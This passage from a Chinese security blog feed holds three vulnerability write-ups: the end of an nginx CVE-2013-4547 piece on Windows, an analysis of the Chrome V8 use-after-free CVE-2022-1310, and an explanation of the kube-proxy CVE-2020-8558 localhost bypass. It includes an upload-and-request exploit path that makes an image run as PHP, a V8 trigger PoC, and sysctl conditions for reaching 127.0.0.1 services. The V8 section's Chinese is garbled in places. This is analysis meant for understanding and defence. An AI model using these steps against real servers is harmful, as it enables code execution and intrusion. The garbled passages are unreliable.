class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#!cpp</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">     HANDLE hFile =<span class="built_in">CreateFile</span>(<span class="string">L&quot;a.txt &quot;</span>,GENERIC_WRITE|GENERIC_READ, <span class="number">0</span>, <span class="comment">//注意a.txt后有一个空格                    </span></span><br><span class="line">              <span class="literal">NULL</span>,                  </span><br><span class="line">              OPEN_EXISTING,          <span class="comment">// 打开存在的文件</span></span><br><span class="line">              FILE_ATTRIBUTE_NORMAL,   </span><br><span class="line">              <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (hFile ==INVALID_HANDLE_VALUE)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;openfailed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">     &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;fileopened&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过此代码可知道，即使我们传入参数是”a.txt ”带空格，最后访问到却确是”a.txt”不带空格</p><p>此时的攻击过程为：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.上传任意文件（不需要带空格文件），</span><br><span class="line">2.http://127.0.0.1/a.jpg(非编码空格)\0.php</span><br></pre></td></tr></table></figure></p><p><img src="https://image-1313245095.cos.ap-beijing.myqcloud.com/2023/01/23/16744875151368.jpg" alt=""><br>图-4文件a.jpg</p><p><img src="https://image-1313245095.cos.ap-beijing.myqcloud.com/2023/01/23/16744875334728.jpg" alt=""><br>图-5漏洞利用</p><p>成功将a.jpg文件当作php代码执行，达到了攻击成功的目的。</p><p>通过windows的此特性，使CVE-2013-4547在windows+nginx的环境中的危害无限扩大，即在windows下，只要普通用户能上传文件，则可利用本次漏洞，导致代码执行，并进一步入侵服务器。</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> 二进制安全 </tag>
            
            <tag> C++ </tag>
            
            <tag> Service </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chrome V8命令执行漏洞分析（CVE-2022-1310）</title>
      <link href="/2022/09/04/Chrome-V8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2022-1310/"/>
      <url>/2022/09/04/Chrome-V8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2022-1310/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p>Google 于 2022 年 4 月 11 日更新了 Chrome 的 100.0.4896.88，其中修复了由@btiszka 在 3 月 18 日报告的正则表达式模块的 UAF 漏洞；6 月 28 日，Google 纰漏出了该漏洞的具体细节，该当前漏洞已被修复公开技术细节，并由此形成技术分析漏洞的修复方式。</p></blockquote><p>本文首先简单介绍 V8 的回收机制，然后结合具体漏洞 PoC 分析漏洞成因。</p><h1 id="V8回收回收机制"><a href="#V8回收回收机制" class="headerlink" title="V8回收回收机制"></a>V8回收回收机制</h1><p>回收一直是 V8 引擎的优化重点，是分析复杂优化组合的机制，其主要采用的跟踪回收算法，在堆放上分代尺寸，大致可以形成使用新生代和老年代，具体回收策略可分为Major GC（Mark-Compact）和Minor GC(Scavenger)。这里只介绍代码对策略的实现分为两个阶段的关键阶段，可以从参考文档和源进行学习。</p><h2 id="Major-GC（Mark-Compact）"><a href="#Major-GC（Mark-Compact）" class="headerlink" title="Major GC（Mark-Compact）"></a>Major GC（Mark-Compact）</h2><p>V8的主要GC负责对堆区的垃圾进行回收，可实分为、、整理阶段，清除阶段释放不使用内存，整理阶段将使用内存移动压，算法的重点在整个阶段标记。</p><p>阶段中，需要收集发现并标记所有对象的活动。收集器从维护中没有开始追踪追踪发现更多新对象的对象，持续标记发现的对象并附随器，直到需要标记的对象。</p><p><img src="https://s2.loli.net/2022/09/04/qQGbu4mciXVK2pI.png" alt="image.png"></p><p>V8 使用三色标记来标注对象，每个对象通过后一个标记位和一个标记来标记，两个标记位标记颜色颜色：（00）、（10）和黑色（1​​1）。所有对象都是白色的工作物，当收集物品最初显示其到发现标记列表时，会变成灰色。当收集器从标记列表器中弹出它并访问其所有时间时，对象变为白色当不再有灰色物体标记完成时，所有剩余的黑色透明地都无法到达，，可以回收。</p><p><img src="https://s2.loli.net/2022/09/04/opRJ4nOh6fWL3X7.png" alt="image.png"></p><h2 id="Minor-GC"><a href="#Minor-GC" class="headerlink" title="Minor GC"></a>Minor GC</h2><p>GC的主要工作在新生代阶段，这些都是可以划分、疏散和精准的阶段，这些都是没有准确的跨阶段交错的空间，要从空间和新生代的空间划分中执行。为了-这两个空间分配的对象管理人员出现在从-空间分级表开始回收完成，Scavenger 继续和交换未来的对象后移动到-空间交换，在空间与新的连接，在空间与新的连接From-Space和To-Space，开始下一轮GC。<br><img src="https://s2.loli.net/2022/09/04/Ub2QHA8asujPTiz.png" alt="image.png"></p><p>这里需要特别介绍障碍（Write-Barrier）机制，它是这个漏洞发生的关键。W-Barrier 维护了一组从旧对象到新对象的指针列表，一般是老旧指向年轻一代中的对象的原因，使用这个引用列表可以直接进行标记，不需要跟踪整个旧的。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Called after atomic_relaxed_write(&amp;object.field, value);</span></span><br><span class="line"><span class="title function_">write_barrier</span>(<span class="params">object, field_offset, value</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (color (value) == white &amp;&amp;<span class="title function_">atomic_color_transition</span>(value, white, grey)) &#123;</span><br><span class="line">marking_worklist.<span class="title function_">push</span>(value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><blockquote><p>可以看到，Write-Barrier 会将一个关联的可访问对象标记为灰色，并在其中标注 valuemarking_worklist，中的标记程序可以允许再遍历旧的对象，直接从列表开始进行标记。</p></blockquote><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>Chrome V8命令执行漏洞（CVE-2022-1310）出现在V8引擎的正则表达式模块，如下在报告中提到的漏洞PoC关键代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> re = <span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;g&#x27;</span>);</span><br><span class="line">re.<span class="property">exec</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">gc</span>(); <span class="comment">// move `re` to oldspace using a mark-sweep gc</span></span><br><span class="line">    <span class="keyword">delete</span> re.<span class="property">exec</span>; <span class="comment">// transition back to initial regexp map to pass HasInitialRegExpMap</span></span><br><span class="line">    re.<span class="property">lastIndex</span> = <span class="number">1073741823</span>; <span class="comment">// maximum smi, adding one will result in a HeapNumber</span></span><br><span class="line">    <span class="title class_">RegExp</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">exec</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="string">&#x27;&#x27;</span>; <span class="comment">// break out of Regexp.replace</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ...;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> newstr = re[<span class="title class_">Symbol</span>.<span class="property">replace</span>](<span class="string">&quot;fooooo&quot;</span>, <span class="string">&quot;.$&quot;</span>); <span class="comment">// trigger</span></span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">gc</span>(&#123;<span class="attr">type</span>:<span class="string">&#x27;minor&#x27;</span>&#125;);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(re.<span class="property">lastIndex</span>);</span><br></pre></td></tr></table></figure><br><code>re[Symbol.replace]</code>通过对比PoC和分析源码，当在JS代码中调用函数时，V8引擎使用<code>Runtime_RegExpReplaceRT</code>函数进行处理，函数中的异常退出分支会调用，该函数最终将加1并写回对象中。<code>RegExpUtils::SetAdvancedStringIndexre.lastIndex</code><br><img src="https://s2.loli.net/2022/09/04/78YphxgPbtmuZcK.png" alt="image.png"></p><p>V8中的数字类型Smi和HeapNumber ，Smi代表了小函数中的代码，和对象中的数据<code>re.lastIndex += 1</code>溢出。指针共享存储空间，通过的最低位是否为0来值类型，Smi表示会在堆中创建<code>HeapNumber</code>对象来的范围，在3个2位下，Smi值为-2^30 2^30 - 1。</p><p><img src="https://s2.loli.net/2022/09/04/boy2X3auPBHG18z.png" alt="image.png"></p><p>可知当我们对RegExp对象范围内的<code>RegExp_Regionre.lastIndex=1073741823</code>时，并ExpReplaceRT逻辑函数超过3个时，由于加了1个之后的值1010个Smi的表示值V 8 在引擎中的对象中申请了一个V 8 重来存储新对象的lastIndex，此时，该RegExp对象的lastIndex属性不再是一个Smi数，而是一个指向堆中HeapNumber对象的指针。如下图所示：</p><p><img src="https://s2.loli.net/2022/09/04/MLKTCkliEnxUj3g.png" alt="image.png"></p><blockquote><p>在之前的垃圾回收中，V8的Minor GC的Write-Barrier需要对将新生代内存中添加的新建对象置灰并到标记列表中，以省略对旧机制对象的遍历。但函数SetLastIndex在处理RegExp对象存在优先映射情况的代码分支中，默认lastIndex是一个Smier标记当跳过了写屏障。因此，relastIndex变成了HeapNumber对象，又没有被Write-Barrier标记，所以在似乎最容易被释放回收的对象，释放释放后重新释放。最后一个索引属性就变成了一个悬垂的位置，该对象被指向了一个对象的空间，再次尝试空间，就产生了了Use-After-Free漏洞。</p></blockquote><p><img src="https://s2.loli.net/2022/09/04/1H7Wpl428jJLX5h.png" alt="image.png"></p><p>CVE-2022-1310是一个典型的 UAF 漏洞，触发可以通过堆喷重新分配释放后的内存空间达到利用的目的</p><p><img src="https://s2.loli.net/2022/09/04/4uGBkaVqDoKvIWJ.png" alt="image.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>漏洞（202-1310）出现的根本原因是因为是8在Write-VE-的时候，没有考虑泄露数据泄露的情况，没有考虑到数字泄露值的处理情况，数字类型的对象类型新分配机制的堆UAF，最终导致了任意执行，修复方案也非常简单，将<code>SKIP_WRITE_BARRIER标记改成UPDATE_WRITE_BARRIER即可。</code></p><p><img src="https://s2.loli.net/2022/09/04/jonfLqVEgmQbUu7.png" alt="image.png"></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1307610">https://bugs.chromium.org/p/chromium/issues/detail?id=1307610</a></p></li><li><p><a href="https://v8.dev/blog/trash-talk">https://v8.dev/blog/trash-talk</a></p></li><li><p><a href="https://v8.dev/blog/concurrent-marking">https://v8.dev/blog/concurrent-marking</a></p></li><li><p><a href="https://chromium.googlesource.com/v8/v8/+/bdc4f54a50293507d9ef51573bab537883560cc8%5E%21/">https://chromium.googlesource.com/v8/v8/+/bdc4f54a50293507d9ef51573bab537883560cc8%5E%21/</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 底层 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 前端 </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-8558-跨主机访问127.0.0.1</title>
      <link href="/2022/08/13/CVE-2020-8558-%E8%B7%A8%E4%B8%BB%E6%9C%BA%E8%AE%BF%E9%97%AE127-0-0-1/"/>
      <url>/2022/08/13/CVE-2020-8558-%E8%B7%A8%E4%B8%BB%E6%9C%BA%E8%AE%BF%E9%97%AE127-0-0-1/</url>
      
        <content type="html"><![CDATA[<h1 id="start"><a href="#start" class="headerlink" title="start"></a>start</h1><p>假设机器A和机器B在同一个局域网，机器A使用<code>nc -l 127.0.0.1 8888</code>，在机器B上可以访问机器A上”仅绑定在127.0.0.1的服务”吗？</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# nc -l 127.0.0.1 8888 &amp;</span><br><span class="line">[1] 44283</span><br><span class="line">[root@instance-h9w7mlyv ~]# netstat -antp|grep 8888</span><br><span class="line">tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      44283/nc</span><br></pre></td></tr></table></figure><blockquote><p>nc用法可能不同，有的使用 nc -l 127.0.0.1 -p 8888 监听8888端口</p></blockquote><p>kubernetes的kube-proxy组件之前披露过CVE-2020-8558漏洞，这个漏洞就可以让”容器内的恶意用户、同一局域网其他机器”访问到node节点上”仅绑定在127.0.0.1的服务”。这样有可能访问到监听在本地的”kubernetes无需认证的apiserver”，进而控制集群。</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="怎么复现？"><a href="#怎么复现？" class="headerlink" title="怎么复现？"></a>怎么复现？</h2><blockquote><p>先说最终结果，基于terraform的漏洞靶场。</p><blockquote><p>terraform可以基于声明式api编排云上的基础设施(虚拟机、网络等)</p></blockquote></blockquote><h1 id="为什么可以访问其他节点的”仅绑定在127-0-0-1的服务”？"><a href="#为什么可以访问其他节点的”仅绑定在127-0-0-1的服务”？" class="headerlink" title="为什么可以访问其他节点的”仅绑定在127.0.0.1的服务”？"></a>为什么可以访问其他节点的”仅绑定在127.0.0.1的服务”？</h1><p>假设实验环境是，一个局域网内有两个节点A和B、交换机，ip地址分别是ip_a和ip_b，mac地址分别是mac_a和mac_b。</p><p>来看看A机器访问B机器时的一个攻击场景。</p><p>如果在tcp握手时，A机器构造一个”恶意的syn包”，数据包信息是：</p><div class="table-container"><table><thead><tr><th>源IP</th><th>源MAC</th><th>目的IP</th><th>目的MAC</th><th>目的端口</th><th>源端口</th></tr></thead><tbody><tr><td>ip_a</td><td>Mac_a</td><td>127.0.0.1</td><td>Mac_b</td><td>8888</td><td>44444(某个随机端口)</td></tr></tbody></table></div><p>此时如果交换机只是根据mac地址做数据转发，它就将syn包发送给B。</p><p>syn包的数据流向是：A -&gt; 交换机 -&gt; B</p><p>B机器网卡在接收到syn包后： 链路层：发现目的mac是自己，于是扔给网络层处理 网络层：发现ip是本机网卡ip，看来要给传输层处理，而不是转发 * 传输层：发现当前”网络命名空间”确实有服务监听 127.0.0.1:8888, 和 “目的ip:目的端口” 可以匹配上，于是准备回复syn-ack包</p><blockquote><p>从”内核协议栈”角度看，发送包会经过”传输层、网络层、链路层、设备驱动”，接受包刚好相反，会经过”设备驱动、链路层、网络层、传输层”</p></blockquote><p>syn-ack数据包信息是:</p><div class="table-container"><table><thead><tr><th>源IP</th><th>源MAC</th><th>目的IP</th><th>目的MAC</th><th>目的端口</th><th>目的端口</th></tr></thead><tbody><tr><td>127.0.0.1</td><td>Mac_b</td><td>Ip_a</td><td>Mac_a</td><td>44444(随地端口)</td><td>8888</td></tr></tbody></table></div><p>syn-ack包的数据流向是：B -&gt; 交换机 -&gt; A</p><p>A机器网卡在收到syn-ack包后，也会走一遍”内核协议栈”的流程，然后发送ack包，完成tcp握手。</p><p>这样A就能访问到B机器上”仅绑定在127.0.0.1的服务”。所以，在局域网内，恶意节点”似乎”很容易就能访问到其他节点的”仅绑定在127.0.0.1的服务”。</p><p>但实际上，A访问到B机器上”仅绑定在127.0.0.1的服务”会因为两大类原因失败： 交换机有做检查，比如它不允许数据包的目的ip地址是127.0.0.1，这样第一个syn包就不会转发给B，tcp握手会失败。公有云厂商的交换机(比如ovs)应该就有类似检查，所以我在<strong>某个公有云厂商vpc网络环境下测试</strong>，无法成功复现漏洞。 数据包到了主机，但是因为ip是127.0.0.1，很特殊，所以”内核协议栈”为了安全把包丢掉了。</p><p>所以不能在云vpc环境下实验，于是我选择了复现”容器访问宿主机上的仅绑定在127.0.0.1的服务”。</p><p>先来看一下，”内核协议栈”为了防止恶意访问”仅绑定在127.0.0.1的服务”都做了哪些限制。</p><h1 id="“内核协议栈”做了哪些限制？"><a href="#“内核协议栈”做了哪些限制？" class="headerlink" title="“内核协议栈”做了哪些限制？"></a>“内核协议栈”做了哪些限制？</h1><p>先说结论，下面三个内核参数都会影响 <code>route_localnet rp_filter * accept_local</code></p><p>以docker网桥模式为例，想要在docker容器中访问到宿主机的”仅绑定在127.0.0.1的服务”，就需要： 宿主机上<code>route_localnet=1</code> docker容器中 <code>rp_filter=0</code>、<code>accept_local=1</code>、<code>route_localnet=1</code></p><p>宿主机网络命名空间中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# sysctl -a|grep route_localnet</span><br><span class="line">net.ipv4.conf.all.route_localnet = 1</span><br><span class="line">net.ipv4.conf.default.route_localnet = 1</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>容器网络命名空间中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# sysctl -a|grep accept_local</span><br><span class="line">net.ipv4.conf.all.accept_local = 1</span><br><span class="line">net.ipv4.conf.default.accept_local = 1</span><br><span class="line">net.ipv4.conf.eth0.accept_local = 1</span><br><span class="line">[root@instance-h9w7mlyv ~]# sysctl -a|grep &#x27;\.rp_filter&#x27;</span><br><span class="line">net.ipv4.conf.all.rp_filter = 0</span><br><span class="line">net.ipv4.conf.default.rp_filter = 0</span><br><span class="line">net.ipv4.conf.eth0.rp_filter = 0</span><br><span class="line">...</span><br></pre></td></tr></table></figure><blockquote><p>容器中和宿主机中因为是不同的网络命名空间，所以关于网络的内核参数是隔离的，并一定相同。</p></blockquote><h1 id="route-localnet配置是什么？"><a href="#route-localnet配置是什么？" class="headerlink" title="route_localnet配置是什么？"></a>route_localnet配置是什么？</h1><p><a href="https://www.kernel.org/doc/Documentation/networking/ip-sysctl.txt">内核文档</a>提到route_localnet参数，如果route_localnet等于0，当收到源ip或者目的ip是”loopback地址”(127.0.0.0/8)时，就会认为是非法数据包，将数据包丢弃。</p><blockquote><p>宿主机上curl 127.0.0.1时，源ip和目的都是127.0.0.1，此时网络能正常通信，说明数据包并没有被丢弃。说明这种情景下，没有调用到 ip_route_input_noref 函数查找路由表。</p></blockquote><p>CVE-2020-8558漏洞中，kube-proxy设置route_localnet=1，导致关闭了上面所说的检查。</p><h1 id="内核协议栈中哪里用route-localnet配置来检查？"><a href="#内核协议栈中哪里用route-localnet配置来检查？" class="headerlink" title="内核协议栈中哪里用route_localnet配置来检查？"></a>内核协议栈中哪里用route_localnet配置来检查？</h1><p><a href="https://elixir.bootlin.com/linux/v4.18/source/net/ipv4/route.c#L1912">参考文档</a></p><p>ip_route_input_slow 函数中用到 route_localnet配置，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  NOTE. We drop all the packets that has local source</span></span><br><span class="line"><span class="comment"> *  addresses, because every properly looped back packet</span></span><br><span class="line"><span class="comment"> *  must have correct destination already attached by output routine.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  Such approach solves two big problems:</span></span><br><span class="line"><span class="comment"> *  1. Not simplex devices are handled properly.</span></span><br><span class="line"><span class="comment"> *  2. IP spoofing attempts are filtered with 100% of guarantee.</span></span><br><span class="line"><span class="comment"> *  called with rcu_read_lock()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ip_route_input_slow</span><span class="params">(<span class="keyword">struct</span> sk_buff *skb, __be32 daddr, __be32 saddr,</span></span><br><span class="line"><span class="params">                   u8 tos, <span class="keyword">struct</span> net_device *dev,</span></span><br><span class="line"><span class="params">                   <span class="keyword">struct</span> fib_result *res)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">/* Following code try to avoid calling IN_DEV_NET_ROUTE_LOCALNET(),</span></span><br><span class="line"><span class="comment">     * and call it once if daddr or/and saddr are loopback addresses</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (ipv4_is_loopback(daddr)) &#123;      <span class="comment">// 目的地址是否&quot;loopback地址&quot;</span></span><br><span class="line">        <span class="keyword">if</span> (!IN_DEV_NET_ROUTE_LOCALNET(in_dev, net))    <span class="comment">// localnet配置是否开启。net是网络命名空间，in_dev是接收数据包设备配置信息</span></span><br><span class="line">            <span class="keyword">goto</span> martian_destination;       <span class="comment">// 认为是非法数据包</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ipv4_is_loopback(saddr)) &#123;       <span class="comment">// 源地址是否&quot;loopback地址&quot;</span></span><br><span class="line">        <span class="keyword">if</span> (!IN_DEV_NET_ROUTE_LOCALNET(in_dev, net))</span><br><span class="line">            <span class="keyword">goto</span> martian_source;    <span class="comment">// 认为是非法数据包</span></span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    err = fib_lookup(net, &amp;fl4, res, <span class="number">0</span>);        <span class="comment">// 查找&quot;路由表&quot;，res存放查找结果</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (res-&gt;type == RTN_BROADCAST)</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (res-&gt;type == RTN_LOCAL) &#123;   <span class="comment">// 数据包应该本机处理</span></span><br><span class="line">        err = fib_validate_source(skb, saddr, daddr, tos,</span><br><span class="line">                  <span class="number">0</span>, dev, in_dev, &amp;itag);  <span class="comment">// &quot;反向查找&quot;, 验证源地址是否有问题</span></span><br><span class="line">        <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">goto</span> martian_source;</span><br><span class="line">        <span class="keyword">goto</span> local_input; <span class="comment">// 本机处理</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!IN_DEV_FORWARD(in_dev)) &#123;   <span class="comment">// 没有开启ip_forward配置时，认为不支持 转发数据包</span></span><br><span class="line">        err = -EHOSTUNREACH;</span><br><span class="line">        <span class="keyword">goto</span> no_route;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    err = ip_mkroute_input(skb, res, in_dev, daddr, saddr, tos, flkeys);    <span class="comment">// 认为此包需要&quot;转发&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ip_rcv_finish</span><span class="params">(<span class="keyword">struct</span> net *net, <span class="keyword">struct</span> sock *sk, <span class="keyword">struct</span> sk_buff *skb)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     *  Initialise the virtual path cache for the packet. It describes</span></span><br><span class="line"><span class="comment">     *  how the packet travels inside Linux networking.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (!skb_valid_dst(skb)) &#123;  <span class="comment">// 是否有路由缓存. 宿主机curl 127.0.0.1时，就有缓存，不用查找路由表。</span></span><br><span class="line">        err = ip_route_input_noref(skb, iph-&gt;daddr, iph-&gt;saddr,</span><br><span class="line">                       iph-&gt;tos, dev);  <span class="comment">// 查找路由表</span></span><br><span class="line">        <span class="keyword">if</span> (unlikely(err))</span><br><span class="line">            <span class="keyword">goto</span> drop_error;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> dst_input(skb);   <span class="comment">// 将数据包交给tcp层(ip_local_deliver) 或 转发数据包(ip_forward)</span></span><br></pre></td></tr></table></figure><p>在收到数据包时，从ip层来看，数据包会经过 ip_rcv(ip层入口函数) -&gt; ip_rcv_finish -&gt; ip_route_input_slow。</p><p>在ip_route_input_slow函数中可以看到，如果源ip或者目的ip是”loopback地址”，并且接收数据包的设备没有配置route_localnet选项时，就会认为是非法数据包。</p><h1 id="rp-filter和accept-local是什么？"><a href="#rp-filter和accept-local是什么？" class="headerlink" title="rp_filter和accept_local是什么？"></a>rp_filter和accept_local是什么？</h1><p><a href="https://www.kernel.org/doc/Documentation/networking/ip-sysctl.txt">内核网络参数详解</a>提到，rp_filter=1时，会严格验证源ip。</p><p>怎么检查源ip呢？就是收到数据包后，将源ip和目的ip对调，然后再查找路由表，找到会用哪个设备回包。如果”回包的设备”和”收到数据包的设备”不一致，就有可能校验失败。这个也就是后面说的”反向检查”。</p><h1 id="内核协议栈中哪里用rp-filter和accept-local配置来检查？"><a href="#内核协议栈中哪里用rp-filter和accept-local配置来检查？" class="headerlink" title="内核协议栈中哪里用rp_filter和accept_local配置来检查？"></a>内核协议栈中哪里用rp_filter和accept_local配置来检查？</h1><p>上面提到 收到数据包时，从ip层来看，会执行 <code>ip_route_input_slow</code>函数查找路由表。</p><p><code>ip_route_input_slow</code>函数会执行<code>fib_validate_source</code>函数执行 “验证源ip”，会使用到<code>rp_filter</code>和<code>accept_local</code>配置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Ignore rp_filter for packets protected by IPsec. */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">fib_validate_source</span><span class="params">(<span class="keyword">struct</span> sk_buff *skb, __be32 src, __be32 dst,</span></span><br><span class="line"><span class="params">            u8 tos, <span class="type">int</span> oif, <span class="keyword">struct</span> net_device *dev,</span></span><br><span class="line"><span class="params">            <span class="keyword">struct</span> in_device *idev, 